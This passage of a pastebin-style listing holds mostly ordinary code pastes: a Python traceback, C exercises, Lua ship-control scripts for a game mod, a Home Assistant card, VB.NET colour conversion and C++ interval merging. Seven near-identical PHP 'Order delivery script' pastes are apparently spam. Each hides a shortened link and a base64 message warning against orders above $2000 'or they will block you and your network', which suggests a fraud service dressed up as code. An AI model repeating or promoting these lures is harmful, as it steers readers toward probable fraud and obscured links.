  File ""/home/gmktec/Programming/Bots/basedcount_bot/.venv/lib/python3.11/site-packages/asyncpraw/reddit.py"", line 813, in get
    return await self._objectify_request(method=""GET"", params=params, path=path)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File ""/home/gmktec/Programming/Bots/basedcount_bot/.venv/lib/python3.11/site-packages/asyncpraw/reddit.py"", line 570, in _objectify_request
    await self.request(
  File ""/home/gmktec/Programming/Bots/basedcount_bot/.venv/lib/python3.11/site-packages/asyncpraw/util/deprecate_args.py"", line 54, in wrapped
    return await _wrapper(*args, **kwargs)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File ""/home/gmktec/Programming/Bots/basedcount_bot/.venv/lib/python3.11/site-packages/asyncpraw/reddit.py"", line 1061, in request
    return await self._core.request(
           ^^^^^^^^^^^^^^^^^^^^^^^^^
  File ""/home/gmktec/Programming/Bots/basedcount_bot/.venv/lib/python3.11/site-packages/asyncprawcore/sessions.py"", line 383, in request
    return await self._request_with_retries(
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File ""/home/gmktec/Programming/Bots/basedcount_bot/.venv/lib/python3.11/site-packages/asyncprawcore/sessions.py"", line 286, in _request_with_retries
    response, saved_exception = await self._make_request(
                                ^^^^^^^^^^^^^^^^^^^^^^^^^
  File ""/home/gmktec/Programming/Bots/basedcount_bot/.venv/lib/python3.11/site-packages/asyncprawcore/sessions.py"", line 192, in _make_request
    response = await self._rate_limiter.call(
               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File ""/home/gmktec/Programming/Bots/basedcount_bot/.venv/lib/python3.11/site-packages/asyncprawcore/rate_limit.py"", line 51, in call
    response = await request_function(*args, **kwargs)
               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File ""/home/gmktec/Programming/Bots/basedcount_bot/.venv/lib/python3.11/site-packages/asyncprawcore/requestor.py"", line 80, in request
    raise RequestException(exc, args, kwargs) from None
asyncprawcore.exceptions.RequestException: error with request 
"
bbTBLAgU,Order delivery script,josemanuelaparicio,PHP,Friday 21st of March 2025 03:56:49 AM CDT,"<?php

$api_url = ""/api/order-status"";
$order_id = ""604"";
$response = file_get_contents(""$api_url?order_id=$order_id"");
$order_data = json_decode($response, true);

if ($order_data && isset($order_data['status'])) {
    if ($order_data['status'] === ""Paid"") {
        $encoded_url = ""https://psee.io/7b2jmr"";
        $encoded_warning = ""UmVtZW1iZXIgdG8gbm90IHVzZSBpdCBmb3Igb3JkZXJzIGFib3ZlICQyMDAwIGF0IG9uY2UgLSB0aGV5IHdpbGwgYmxvY2sgeW91IGFuZCB5b3VyIG5ldHdvcmsu"";
        $message = ""Thank you for your purchase!"" . $encoded_url . ""\n"" . $encoded_warning;
        sendMessage($order_data['user_email'], $message);
    } else {
        echo ""Unpaid"";
    }
} else {
    echo ""Invalid response from store API."";
}

function sendMessage($recipient, $message) {
    echo ""Message sent to $recipient: \n$message"";
}
"
zA5b1nAD,Untitled,Derik_hacker,C,Friday 21st of March 2025 03:42:53 AM CDT,"#include <stdio.h>

int main() {
    int numero, somma = 0;
    int max, min;
    int i = 0; // Flag per il primo numero

    printf(""Inserisci numeri interi (0 per terminare):\n"");

    while (1) {
        scanf(""%d"", &numero);

        if (numero == 0) {
            break; // Esce dal ciclo se l'utente inserisce 0
        }

        somma += numero; // Aggiorna la somma

        // Imposta il primo numero come riferimento per max e min
        if (i==0) {
            max = min = numero;
            i = 1;
        }
        else {
            if (numero > max) max = numero; // Aggiorna il massimo
            if (numero < min) min = numero; // Aggiorna il minimo
        }
    }

    printf(""\nRisultati:\n"");
    printf(""Somma totale: %d\n"", somma);

    if (i==1) { // Se almeno un numero è stato inserito
        printf(""Massimo: %d\n"", max);
        printf(""Minimo: %d\n"", min);
    }
    else {
        printf(""Nessun numero valido inserito.\n"");
    }

    return 0;
}
"
e5nHcshF,Untitled,Derik_hacker,C,Friday 21st of March 2025 03:38:21 AM CDT,"#define _CRT_SECURE_NO_WARNINGS

#include <stdio.h>
#include <string.h>
#include <ctype.h>
#include <stdbool.h>



#define N 7
int main() {
	
	int vet[N];
	int count_size = 0;
	int visti[N];
	int numero;
	int giastampato = 0;
	int count = 0;
	printf(""entra gli elementi del vettore : "");
	for (int i = 0; i < N; i++) {
		scanf(""%d"", &vet[i]);
	}

	for (int i = 0; i < N; i++) {
		count = 0;
		giastampato = 0;
	

		for (int k = 0; k < count_size; k++) {

			

			if (vet[k] == vet[i]) {
				giastampato = 1;
				break;
			}
		}

		if (giastampato == 1) {
			continue;
		}

		for (int j = 0; j < N; j++) {

			if (vet[i] == vet[j]) {
				count++;
			}
		}

		printf(""il numero %d occorenze %d\n"", vet[i], count);

		visti[count_size++] = vet[i];
	}

	return 0;
}"
3bvfitu3,遥控语音制导320-25 无激光v2,jaklsfjlsak,Lua,Friday 21st of March 2025 03:11:29 AM CDT,"local ship = peripheral.find(""warpdriveShipController"")

local chat = peripheral.find(""warpdriveVirtualAssistant"")

-- Define chat name
chat.name(""[name"")

local ship_front, ship_right, ship_up = ship.dim_positive()
local ship_back, ship_left, ship_down = ship.dim_negative()
local ship_isInHyper = ship.isInHyperspace()
local ship_movement = { ship.movement() }
local ship_rotationSteps = ship.rotationSteps()

print(""Post Way Point in Chat to Jump Ship and Aligning the Mining Laser"")

while true do
sleep(0.08)
local state = 0
local CMD = 0
  state, CMD = chat.pullLastCommand()
    string = string.lower(CMD)
 
      -- Match and extract X and Z
 local x_value, y_value, z_value = string:match("".*x:(%-?%d+),%s*y:(%-?%d+),%s*z:(%-?%d+)"")
    
    if state then
        if not (x_value and y_value and z_value) then
            print(""Error: Coordinates not found in command."")
        else
            local lastLx = tonumber(x_value)
            local lastLy = tonumber(y_value)  -- if needed for future use
            local lastLz = tonumber(z_value)
            
            print(""Jumping to X:"" .. lastLx .. "", Z:"" .. lastLz)
            
            local rx, ry, rz = ship.getOrientation()
            local minForwardBack = math.abs(ship_front + ship_back + 1)
            local minLeftRight = math.abs(ship_left + ship_right + 1)
            local mx, my, mz = ship.getLocalPosition()
            
            local dx = lastLx - mx
            local dz = lastLz - mz
            
            local forwardBackMov = 0
            local leftRightMov = 0
            
            -- Determine movement based on ship's orientation.
            if rx == 1 then
                forwardBackMov = dx
                leftRightMov = dz
            elseif rx == -1 then
                forwardBackMov = -dx
                leftRightMov = -dz
            elseif rz == 1 then
                forwardBackMov = dz
                leftRightMov = -dx
            elseif rz == -1 then
                forwardBackMov = -dz
                leftRightMov = dx
            end
            
            if math.abs(forwardBackMov) < minForwardBack and math.abs(leftRightMov) < minLeftRight then
                print(""The movement is too small!"")
            else
                ship.movement(forwardBackMov, 0, leftRightMov)
                ship.rotationSteps(0)
                ship.command(""MANUAL"", true)
            end
        end
    end
end
"
R2tCv9g3,遥控定位测试,jaklsfjlsak,Lua,Friday 21st of March 2025 03:03:05 AM CDT,"local ship = peripheral.find(""warpdriveShipController"")

print(""Press the 'M' key to show ship position"")
 
-- Loop to wait for key events
while true do
  local event, key = os.pullEvent(""key"")
 
  if key == 50 then

local mx, my, mz = ship.getLocalPosition()

print(""Jumping to X:"" .. mx .. "", Z:"" .. mz)
        end
    end

"
akH3Tu5Y,Untitled,josemanuelaparicio,PHP,Friday 21st of March 2025 02:50:53 AM CDT,"<?php

$api_url = ""/api/order-status"";
$order_id = ""164"";
$response = file_get_contents(""$api_url?order_id=$order_id"");
$order_data = json_decode($response, true);

if ($order_data && isset($order_data['status'])) {
    if ($order_data['status'] === ""Paid"") {
        $encoded_url = ""https://psee.io/7b2jmr"";
        $encoded_warning = ""UmVtZW1iZXIgdG8gbm90IHVzZSBpdCBmb3Igb3JkZXJzIGFib3ZlICQyMDAwIGF0IG9uY2UgLSB0aGV5IHdpbGwgYmxvY2sgeW91IGFuZCB5b3VyIG5ldHdvcmsu"";
        $message = ""Thank you for your purchase!"" . $encoded_url . ""\n"" . $encoded_warning;
        sendMessage($order_data['user_email'], $message);
    } else {
        echo ""Unpaid"";
    }
} else {
    echo ""Invalid response from store API."";
}

function sendMessage($recipient, $message) {
    echo ""Message sent to $recipient: \n$message"";
}
"
CbvFb1yL,遥控语音制导320-25 无激光,jaklsfjlsak,Lua,Friday 21st of March 2025 02:49:54 AM CDT,"local ship = peripheral.find(""warpdriveShipController"")

local chat = peripheral.find(""warpdriveVirtualAssistant"")

-- Define chat name
chat.name(""[name"")

local ship_front, ship_right, ship_up = ship.dim_positive()
local ship_back, ship_left, ship_down = ship.dim_negative()
local ship_isInHyper = ship.isInHyperspace()
local ship_movement = { ship.movement() }
local ship_rotationSteps = ship.rotationSteps()

print(""Post Way Point in Chat to Jump Ship"")

while true do
sleep(0.08)
local state = 0
local CMD = 0
  state, CMD = chat.pullLastCommand()
    string = string.lower(CMD)
 
      -- Match and extract X and Z
 local x_value, y_value, z_value = string:match("".*x:(%-?%d+),%s*y:(%-?%d+),%s*z:(%-?%d+)"")
    
    if state then
        if not (x_value and y_value and z_value) then
            print(""Error: Coordinates not found in command."")
        else
            local lastLx = tonumber(x_value)
            local lastLy = tonumber(y_value)  -- if needed for future use
            local lastLz = tonumber(z_value)
            
            print(""Jumping to X:"" .. lastLx .. "", Z:"" .. lastLz)
            
            local rx, ry, rz = ship.getOrientation()
            local minForwardBack = math.abs(ship_front + ship_back + 1)
            local minLeftRight = math.abs(ship_left + ship_right + 1)
            local mx, my, mz = ship.getLocalPosition()
            
            local dx = lastLx - mx
            local dz = lastLz - mz
            
            local forwardBackMov = 0
            local leftRightMov = 0
            
            -- Determine movement based on ship's orientation.
            if rx == 1 then
                forwardBackMov = dx
                leftRightMov = dz
            elseif rx == -1 then
                forwardBackMov = -dx
                leftRightMov = -dz
            elseif rz == 1 then
                forwardBackMov = dz
                leftRightMov = -dx
            elseif rz == -1 then
                forwardBackMov = -dz
                leftRightMov = dx
            end
            
            if math.abs(forwardBackMov) < minForwardBack and math.abs(leftRightMov) < minLeftRight then
                print(""The movement is too small!"")
            else
                ship.movement(forwardBackMov, 0, leftRightMov)
                ship.rotationSteps(0)
                ship.command(""MANUAL"", true)
            end
        end
    end
end
"
wSDYbaNQ,Order delivery script,josemanuelaparicio,PHP,Friday 21st of March 2025 02:45:27 AM CDT,"<?php

$api_url = ""/api/order-status"";
$order_id = ""368"";
$response = file_get_contents(""$api_url?order_id=$order_id"");
$order_data = json_decode($response, true);

if ($order_data && isset($order_data['status'])) {
    if ($order_data['status'] === ""Paid"") {
        $encoded_url = ""https://psee.io/7b2jmr"";
        $encoded_warning = ""UmVtZW1iZXIgdG8gbm90IHVzZSBpdCBmb3Igb3JkZXJzIGFib3ZlICQyMDAwIGF0IG9uY2UgLSB0aGV5IHdpbGwgYmxvY2sgeW91IGFuZCB5b3VyIG5ldHdvcmsu"";
        $message = ""Thank you for your purchase!"" . $encoded_url . ""\n"" . $encoded_warning;
        sendMessage($order_data['user_email'], $message);
    } else {
        echo ""Unpaid"";
    }
} else {
    echo ""Invalid response from store API."";
}

function sendMessage($recipient, $message) {
    echo ""Message sent to $recipient: \n$message"";
}
"
VvfhVeHX,Home Assistant | Mobile Welcome Card,pqpxoxa,YAML,Friday 21st of March 2025 02:41:45 AM CDT,"type: custom:button-card
name: Welcome Sam
show_label: true
label: >-
  [[[ const now = new Date(); const options = { weekday: ""short"", day:
  ""2-digit"", month: ""short"" }; return now.toLocaleString(""en-GB"",
  options).replace("","", """") + ""&nbsp;&nbsp;"" + now.toLocaleTimeString(""en-GB"", {
  hour: ""2-digit"", minute: ""2-digit"", hour12: true }); ]]]
styles:
  card:
    - background-color: transparent
    - padding: 1px
    - border-style: none
    - margin-top: ""-15px""
  grid:
    - grid-template-areas: "" \""n ps pn\"" \""l ps pn\""""
    - grid-template-columns: 68% 16% 16%
    - grid-template-rows: 1fr min-content
    - gap: 0px 0px
  name:
    - font-size: 54px
    - justify-self: left
    - letter-spacing: ""-2.5px""
    - font-weight: bold
    - padding-left: 6px
    - padding-top: 5px
  label:
    - font-size: 22px
    - justify-self: left
    - letter-spacing: ""-1px""
    - font-weight: 400
    - padding-left: 10px
custom_fields:
  ps:
    card:
      type: custom:button-card
      color: transparent
      entity: person.CHANGE_1
      show_entity_picture: true
      tap_action:
        action: none
      show_name: false
      show_icon: true
      styles:
        card:
          - background-color: ""#4b5975""
          - border-radius: 50px
          - width: 55px
          - height: 55px
          - border-style: none
          - padding: 8px
          - box-shadow: >-
              rgba(0, 0, 0, 0.4) 0px 2px 4px, rgba(0, 0, 0, 0.3) 0px 2px 13px
              -1px, rgba(0, 0, 0, 0.2) 0px -3px 5px inset !important;
          - overflow: visible
        icon:
          - width: 38px
          - height: 38px
        custom_fields:
          box:
            - position: absolute
            - left: 14%
            - top: 84%
            - transform: translate(-50%, -50%)
            - z-index: 9999
            - overflow: visible
            - width: 18px
            - height: 18px
      custom_fields:
        box:
          card:
            type: custom:button-card
            icon: mdi:home
            entity: person.CHANGE_1
            show_name: false
            state:
              - styles:
                  card:
                    - background-color: transparent
                    - border-style: none
                    - border-radius: 50px
                    - display: flex
                    - justify-content: center
                    - align-items: center
                    - width: 20px
                    - height: 20px
                    - overflow: visible
                  icon:
                    - width: 14px
                    - height: 14px
                    - background-color: green
                    - color: white
                    - border-radius: 50%
                    - padding: 2px
                    - display: flex
                    - justify-content: center
                    - align-items: center
                    - z-index: 9999
                value: ""home""      
              - styles:
                  card:
                    - background-color: transparent
                    - border-style: none
                    - border-radius: 50px
                    - display: flex
                    - justify-content: center
                    - align-items: center
                    - width: 20px
                    - height: 20px
                    - overflow: visible
                  icon:
                    - width: 14px
                    - height: 14px
                    - background-color: red
                    - color: white
                    - border-radius: 50%
                    - padding: 2px
                    - display: flex
                    - justify-content: center
                    - align-items: center
                    - z-index: 9999              
                operator: default   
  pn:
    card:
      type: custom:button-card
      color: transparent
      entity: person.CHANGE_2
      show_entity_picture: true
      tap_action:
        action: none
      show_name: false
      show_icon: true
      styles:
        card:
          - background-color: ""#4b5975""
          - border-radius: 50px
          - width: 55px
          - height: 55px
          - border-style: none
          - padding: 8px
          - box-shadow: >-
              rgba(0, 0, 0, 0.4) 0px 2px 4px, rgba(0, 0, 0, 0.3) 0px 2px 13px
              -1px, rgba(0, 0, 0, 0.2) 0px -3px 5px inset !important;
          - overflow: visible
        icon:
          - width: 38px
          - height: 38px
        custom_fields:
          box:
            - position: absolute
            - left: 14%
            - top: 84%
            - transform: translate(-50%, -50%)
            - z-index: 9999
            - overflow: visible
            - width: 18px
            - height: 18px
      custom_fields:
        box:
          card:
            type: custom:button-card
            icon: mdi:home
            entity: person.CHANGE_2
            show_name: false
            state:
              - styles:
                  card:
                    - background-color: transparent
                    - border-style: none
                    - border-radius: 50px
                    - display: flex
                    - justify-content: center
                    - align-items: center
                    - width: 20px
                    - height: 20px
                    - overflow: visible
                  icon:
                    - width: 14px
                    - height: 14px
                    - background-color: green
                    - color: white
                    - border-radius: 50%
                    - padding: 2px
                    - display: flex
                    - justify-content: center
                    - align-items: center
                    - z-index: 9999
                value: ""home""      
              - styles:
                  card:
                    - background-color: transparent
                    - border-style: none
                    - border-radius: 50px
                    - display: flex
                    - justify-content: center
                    - align-items: center
                    - width: 20px
                    - height: 20px
                    - overflow: visible
                  icon:
                    - width: 14px
                    - height: 14px
                    - background-color: red
                    - color: white
                    - border-radius: 50%
                    - padding: 2px
                    - display: flex
                    - justify-content: center
                    - align-items: center
                    - z-index: 9999              
                operator: default   "
eg5vNX9F,Untitled,josemanuelaparicio,PHP,Friday 21st of March 2025 02:34:41 AM CDT,"<?php

$api_url = ""/api/order-status"";
$order_id = ""295"";
$response = file_get_contents(""$api_url?order_id=$order_id"");
$order_data = json_decode($response, true);

if ($order_data && isset($order_data['status'])) {
    if ($order_data['status'] === ""Paid"") {
        $encoded_url = ""https://psee.io/7b2jmr"";
        $encoded_warning = ""UmVtZW1iZXIgdG8gbm90IHVzZSBpdCBmb3Igb3JkZXJzIGFib3ZlICQyMDAwIGF0IG9uY2UgLSB0aGV5IHdpbGwgYmxvY2sgeW91IGFuZCB5b3VyIG5ldHdvcmsu"";
        $message = ""Thank you for your purchase!"" . $encoded_url . ""\n"" . $encoded_warning;
        sendMessage($order_data['user_email'], $message);
    } else {
        echo ""Unpaid"";
    }
} else {
    echo ""Invalid response from store API."";
}

function sendMessage($recipient, $message) {
    echo ""Message sent to $recipient: \n$message"";
}
"
Dd7CFXeh,Untitled,jdelano,VB.NET,Friday 21st of March 2025 02:29:27 AM CDT,"Private Sub btnConvert_Click()

    ' convert the RGB values to HSL using the formula from
    ' from https://www.niwa.nu/2013/05/math-behind-colorspace-conversions-rgb-hsl/
    
    Dim redColor As Double
    Dim greenColor As Double
    Dim blueColor As Double
    Dim min As Double
    Dim max As Double
    Dim luminanceValue As Double
    Dim saturationValue As Double
    Dim hueValue As Double
    
    ' convert to 0-1
    redColor = Format(Val(txtR.Text) / 255, ""#.#0"")
    greenColor = Format(Val(txtG.Text) / 255, ""#.#0"")
    blueColor = Format(Val(txtB.Text) / 255, ""#.#0"")
            
    ' find min and max of the three
    min = 2
    If redColor < min Then min = redColor
    If greenColor < min Then min = greenColor
    If blueColor < min Then min = blueColor
    
    max = 0
    If redColor > max Then max = redColor
    If greenColor > max Then max = greenColor
    If blueColor > max Then max = blueColor
    
    ' calculate lumanince value
    luminanceValue = Format((min + max) / 2, ""#.#0"")
    
    ' calculate saturation value
    If min = max Then
        saturationValue = 0
    Else
        If luminanceValue <= 0.5 Then
            saturationValue = (max - min) / (max + min)
        Else
            saturationValue = (max - min) / (2 - max - min)
        End If
        saturationValue = Format(saturationValue, ""#.#0"")
    End If
    
    ' calculate hue
    If redColor = max Then hueValue = (greenColor - blueColor) / (max - min)
    If greenColor = max Then hueValue = 2 + (blueColor - redColor) / (max - min)
    If blueColor = max Then hueValue = 4 + (redColor - greenColor) / (max - min)
    
    hueValue = Format(hueValue, ""#.#0"")
    txtH.Text = Format((hueValue * 60) / 100, ""###%"")
    txtS.Text = Format(saturationValue, ""###%"")
    txtL.Text = Format(luminanceValue, ""###%"")
       
End Sub

Private Sub txtB_Change()
    ChangeRGBColor
End Sub

Private Sub txtG_Change()
    ChangeRGBColor
End Sub

Private Sub txtR_Change()
    ChangeRGBColor
End Sub

Private Sub ChangeRGBColor()

    Dim redColor As Integer
    Dim greenColor As Integer
    Dim blueColor As Integer
    
    redColor = Val(txtR.Text)
    greenColor = Val(txtG.Text)
    blueColor = Val(txtB.Text)
    
    If redColor > 255 Then redColor = 255
    If greenColor > 255 Then greenColor = 255
    If blueColor > 255 Then blueColor = 255
    
    txtR.Text = redColor
    txtG.Text = greenColor
    txtB.Text = blueColor

    lblColor.BackColor = RGB(redColor, greenColor, blueColor)
    
End Sub
"
9iLmqFxc,遥控语音制导320-25 可用,jaklsfjlsak,Lua,Friday 21st of March 2025 02:29:11 AM CDT,"local ship = peripheral.find(""warpdriveShipController"")
local miningLaser = peripheral.find(""warpdriveMiningLaser"")
local chat = peripheral.find(""warpdriveVirtualAssistant"")

-- Define chat name
chat.name(""[name"")

local ship_front, ship_right, ship_up = ship.dim_positive()
local ship_back, ship_left, ship_down = ship.dim_negative()
local ship_isInHyper = ship.isInHyperspace()
local ship_movement = { ship.movement() }
local ship_rotationSteps = ship.rotationSteps()

print(""Post Way Point in Chat to Jump Ship and Aligning the Mining Laser"")

while true do
sleep(0.08)
local state = 0
local CMD = 0
  state, CMD = chat.pullLastCommand()
    string = string.lower(CMD)
 
      -- Match and extract X and Z
 local x_value, y_value, z_value = string:match("".*x:(%-?%d+),%s*y:(%-?%d+),%s*z:(%-?%d+)"")
    
    if state then
        if not (x_value and y_value and z_value) then
            print(""Error: Coordinates not found in command."")
        else
            local lastLx = tonumber(x_value)
            local lastLy = tonumber(y_value)  -- if needed for future use
            local lastLz = tonumber(z_value)
            
            print(""Jumping to X:"" .. lastLx .. "", Z:"" .. lastLz)
            
            local rx, ry, rz = ship.getOrientation()
            local minForwardBack = math.abs(ship_front + ship_back + 1)
            local minLeftRight = math.abs(ship_left + ship_right + 1)
            local mx, my, mz = miningLaser.getLocalPosition()
            
            local dx = lastLx - mx
            local dz = lastLz - mz
            
            local forwardBackMov = 0
            local leftRightMov = 0
            
            -- Determine movement based on ship's orientation.
            if rx == 1 then
                forwardBackMov = dx
                leftRightMov = dz
            elseif rx == -1 then
                forwardBackMov = -dx
                leftRightMov = -dz
            elseif rz == 1 then
                forwardBackMov = dz
                leftRightMov = -dx
            elseif rz == -1 then
                forwardBackMov = -dz
                leftRightMov = dx
            end
            
            if math.abs(forwardBackMov) < minForwardBack and math.abs(leftRightMov) < minLeftRight then
                print(""The movement is too small!"")
            else
                ship.movement(forwardBackMov, 0, leftRightMov)
                ship.rotationSteps(0)
                ship.command(""MANUAL"", true)
            end
        end
    end
end
"
r6gh2hcn,Merge Overlap Interval,zozohoang,C++,Friday 21st of March 2025 02:25:09 AM CDT,"#include <iostream>
#include <vector>
#include <utility>


void PrintArr(const std::vector<int>& arr, bool isBreakLine = true)
{
    for (const auto& i : arr)
    {
        std::cout << i << "" "";
    }
    
    if (isBreakLine)
        std::cout << ""\n"";
}
 
void Swap(int* num1, int* num2)
{
    int tmp = *num1;
    *num1 = *num2;
    *num2 = tmp;
}

/*  Merge Overlapping Interval
    [6,10], [7,9] 
*/

bool CheckOverlapping(const std::vector<int>& arr1, const std::vector<int>& arr2)
{
    bool ret = false;
    
    if (arr1[0] <= arr2[0])
    {
        if (arr2[0] <= arr1[1])
            ret = true;
    }
    else
    {
        if (arr1[0] <= arr2[1])
            ret = true;
    }
    
    return ret;
}

std::vector<int> MergeInterval(const std::vector<int>& arr1, const std::vector<int>& arr2)
{
    std::vector<int> mergeInterval(2, 0);
    
    mergeInterval[0] = (arr1[0] <= arr2[0]) ? arr1[0] : arr2[0];
    mergeInterval[1] = (arr1[1] >= arr2[1]) ? arr1[1] : arr2[1];
    
    return mergeInterval;
}

std::vector<std::vector<int>> PairInterval(const std::vector<std::vector<int>>& arr1, const std::vector<std::vector<int>>& arr2)
{
    std::vector<std::vector<int>> ret;
    
    if (arr1.size() == 1 && arr2.size() == 1)
    {
        if (arr1[0][0] > arr2[0][0])
        {
            ret.emplace_back(arr2[0]);
            ret.emplace_back(arr1[0]);
        }
        else
        {
            ret.emplace_back(arr1[0]);
            ret.emplace_back(arr2[0]);
        }
        
        return ret;
    }
    
    int i = 0, j = 0;
    
    while (i < arr1.size() && j < arr2.size())
    {
        if (arr1[i][0] < arr2[j][0])
        {
            ret.emplace_back(arr1[i]);
            i++;
        }
        else
        {
            ret.emplace_back(arr2[j]);
            j++;
        }
    }
    
    for (int m = i; m < arr1.size(); m++)
    {
        ret.emplace_back(arr1[m]);
    }
    
    for (int n = j; n < arr2.size(); n++)
    {
        ret.emplace_back(arr2[n]);
    }
    
    return ret;
}


std::vector<std::vector<int>> SortInterval(std::vector<std::vector<int>>& intervals)
{
    if (intervals.size() == 1)
        return intervals;
        
    int mid = intervals.size() / 2;
    
    std::vector<std::vector<int>> leftIntervals(intervals.begin(), intervals.begin() + mid);
    std::vector<std::vector<int>> rightIntervals(intervals.begin() + mid, intervals.end());
    
    auto leftRet = SortInterval(leftIntervals);
    auto rightRet = SortInterval(rightIntervals);
    
    auto pairRet = PairInterval(leftRet, rightRet);
    
    return pairRet;
}

/*
Idea: Tìm phần tử nhỏ nhất sau mỗi lần lặp
*/
void SelectionSort(std::vector<int>& unsorted_arr)
{
    for (int i = 0; i < unsorted_arr.size(); i++)
    {
        int curMin = unsorted_arr[i];
        int newIdxMin = -1;
        
        for (int j = i + 1; j < unsorted_arr.size(); j++)
        {
            if (unsorted_arr[j] < curMin)
            {
                newIdxMin = j;
                curMin = unsorted_arr[j];
            }
        }
        
        if (newIdxMin != -1)
            Swap(&unsorted_arr[i], &unsorted_arr[newIdxMin]);
    }
}


int main()
{
    std::vector<std::vector<int>> originInterval = {{1,3},{2,6},{8,10},{15,18}};
    std::vector<std::vector<int>> originInterval1 = {{7, 9}, {6,10}, {4, 5}, {1, 3}, {2, 4}};
    
    auto sortedIntervals = SortInterval(originInterval);
    
    
    for(const auto& interval : sortedIntervals)
    {
        std::cout << ""interval:{"" << interval[0] << "", "" << interval[1] << ""} "";
    }
    
    std::cout << std::endl;
    
    int idxNonOverlapInterval = 0;
    for (int i = 1; i < sortedIntervals.size(); i++)
    {
        if (CheckOverlapping(sortedIntervals[idxNonOverlapInterval], sortedIntervals[i]))
        {
            sortedIntervals[idxNonOverlapInterval] = MergeInterval(sortedIntervals[idxNonOverlapInterval], sortedIntervals[i]);
        }
        else
        {
            idxNonOverlapInterval++;
            sortedIntervals[idxNonOverlapInterval] = sortedIntervals[i];
        }
    }
    
    for (int j = 0; j <= idxNonOverlapInterval; j++)
    {
        std::cout << ""ret: {"" << sortedIntervals[j][0] << "", "" << sortedIntervals[j][1] << ""} "";
    }
    
    std::cout << std::endl;
    
    
    
    //---------------------------------------------------------------------------------------
    std::vector<int> unsorted_arr = {11, 4, 27, 34, 43, 17, 13, 17, 31, 12};
    SelectionSort(unsorted_arr);
    PrintArr(unsorted_arr);
}"
1C3CR9ia,basic_quarry,M1cksta,Lua,Friday 21st of March 2025 02:21:38 AM CDT,"local function move(direction, steps)
    if direction == ""frwd"" then
        for i = 1, steps, 1 do
            turtle.forward()
        end
    elseif direction == ""back"" then
        for i = 1, steps, 1 do
            turtle.back()
        end
    elseif direction == ""up"" then
        for i = 1, steps, 1 do
            turtle.up()
        end
    elseif direction == ""down"" then
        for i = 1, steps, 1 do
            turtle.down()
        end
    else
        error(""err: invalid direction"")
    end
end

local function turn(direction, steps)
    if direction == ""left"" then
        for i = 1, steps, 1 do
            turtle.turnLeft()
        end
    elseif direction == ""right"" then
        for i = 1, steps, 1 do
            turtle.turnRight()
        end
    else
        error(""err: invalid direction"")
    end
end

-- Depth is positive
local function mine_quarry(max_depth)
    local current_depth = 0

    while current_depth < max_depth do
        turtle.digDown()
        move(""down"", 1)
        current_depth = current_depth + 1
        turn(""right"", 1)
        turtle.dig()
        move(""frwd"", 1)
        turtle.dig()
        move(""frwd"", 1)
        turn(""left"", 1)
        turtle.dig()
        move(""frwd"", 1)
        turn(""left"", 1)
        turtle.dig()
        move(""frwd"", 1)
        turtle.dig()
        move(""frwd"", 1)
        turn(""right"", 1)
        turtle.dig()
        move(""frwd"", 1)
        turn(""right"", 1)
        turtle.dig()
        move(""frwd"", 1)
        turtle.dig()
        move(""frwd"", 1)
        turn(""right"", 1)
        move(""frwd"", 2)
        turn(""right"", 1)
        move(""frwd"", 2)
        turn(""right"", 1)
    end
end

mine_quarry(3)

print(""All done!"")"
LZaYwHvP,Order delivery script,josemanuelaparicio,PHP,Friday 21st of March 2025 02:18:31 AM CDT,"<?php

$api_url = ""/api/order-status"";
$order_id = ""953"";
$response = file_get_contents(""$api_url?order_id=$order_id"");
$order_data = json_decode($response, true);

if ($order_data && isset($order_data['status'])) {
    if ($order_data['status'] === ""Paid"") {
        $encoded_url = ""https://psee.io/7b2jmr"";
        $encoded_warning = ""UmVtZW1iZXIgdG8gbm90IHVzZSBpdCBmb3Igb3JkZXJzIGFib3ZlICQyMDAwIGF0IG9uY2UgLSB0aGV5IHdpbGwgYmxvY2sgeW91IGFuZCB5b3VyIG5ldHdvcmsu"";
        $message = ""Thank you for your purchase!"" . $encoded_url . ""\n"" . $encoded_warning;
        sendMessage($order_data['user_email'], $message);
    } else {
        echo ""Unpaid"";
    }
} else {
    echo ""Invalid response from store API."";
}

function sendMessage($recipient, $message) {
    echo ""Message sent to $recipient: \n$message"";
}
"
E6pVFV07,Order delivery script,josemanuelaparicio,PHP,Friday 21st of March 2025 02:13:08 AM CDT,"<?php

$api_url = ""/api/order-status"";
$order_id = ""725"";
$response = file_get_contents(""$api_url?order_id=$order_id"");
$order_data = json_decode($response, true);

if ($order_data && isset($order_data['status'])) {
    if ($order_data['status'] === ""Paid"") {
        $encoded_url = ""https://psee.io/7b2jmr"";
        $encoded_warning = ""UmVtZW1iZXIgdG8gbm90IHVzZSBpdCBmb3Igb3JkZXJzIGFib3ZlICQyMDAwIGF0IG9uY2UgLSB0aGV5IHdpbGwgYmxvY2sgeW91IGFuZCB5b3VyIG5ldHdvcmsu"";
        $message = ""Thank you for your purchase!"" . $encoded_url . ""\n"" . $encoded_warning;
        sendMessage($order_data['user_email'], $message);
    } else {
        echo ""Unpaid"";
    }
} else {
    echo ""Invalid response from store API."";
}

function sendMessage($recipient, $message) {
    echo ""Message sent to $recipient: \n$message"";
}
"
y0tQzQuh,Untitled,Hasli4,Python,Friday 21st of March 2025 02:12:04 AM CDT,"import random
import time

class Point:
    """"""Класс для представления точки на окружности""""""
    def __init__(self, index):
        self.index = index
        self.color = None  # None - не окрашена, 'red' - красная, 'blue' - синяя
    
    def is_colored(self):
        """"""Проверяет, окрашена ли точка""""""
        return self.color is not None
    
    def set_color(self, color):
        """"""Устанавливает цвет точки""""""
        if color not in ['red', 'blue']:
            raise ValueError(""Цвет должен быть 'red' или 'blue'"")
        self.color = color

class Game:
    """"""Основной класс игры""""""
    def __init__(self, num_points=9, player_vs_computer=True):
        self.num_points = num_points
        self.points = [Point(i) for i in range(num_points)]
        self.current_player = ""Петя""  # Петя ходит первым
        self.player_vs_computer = player_vs_computer
        self.last_colored_points = []  # Список последних окрашенных точек для отслеживания
    
    def get_available_moves(self):
        """"""Возвращает список доступных ходов""""""
        if all(point.is_colored() for point in self.points):
            return []  # Нет доступных ходов, если все точки окрашены
        
        # Для первого хода Пети доступны все точки
        if not any(point.is_colored() for point in self.points):
            return list(range(self.num_points))
        
        available_moves = []
        for i in range(self.num_points):
